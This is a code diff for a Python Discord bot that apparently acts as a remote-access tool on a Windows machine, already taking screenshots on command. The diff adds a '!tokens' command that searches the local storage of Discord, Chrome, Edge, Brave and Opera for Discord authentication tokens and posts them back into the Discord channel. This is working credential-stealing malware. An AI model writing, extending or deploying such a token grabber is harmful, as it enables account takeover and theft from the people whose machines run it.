@@ -1,4 +1,4 @@
-import os, discord, subprocess, requests, pyautogui
+import os, discord, subprocess, requests, pyautogui, re
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -112,6 +112,37 @@ async def on_message(message):
         embed = discord.Embed(title="Screenshot", color=0xfafafa)
         embed.set_image(url="attachment://screenshot.png")
         await message.reply(embed=embed, file=file)
+
+    if message.content == "!tokens":
+        paths = [
+            os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera", "Local Storage", "leveldb"),
+        ]
+        tokens = []
+        for path in paths:
+            if not os.path.exists(path):
+                continue
+            
+            for file in os.listdir(path):
+                if not file.endswith(".log") and not file.endswith(".ldb"):
+                    continue
+                for line in [x.strip() for x in open(os.path.join(path, file), errors="ignore").readlines() if x.strip()]:
+                    for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"]:
+                        for token in re.findall(regex, line):
+                            tokens.append(token)
+        tokens = "\n".join(tokens)
+        if tokens == "":
+            tokens = "No tokens found"
+        embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xfafafa)
+        await message.reply(embed=embed)
 
 bot.run(token)
 
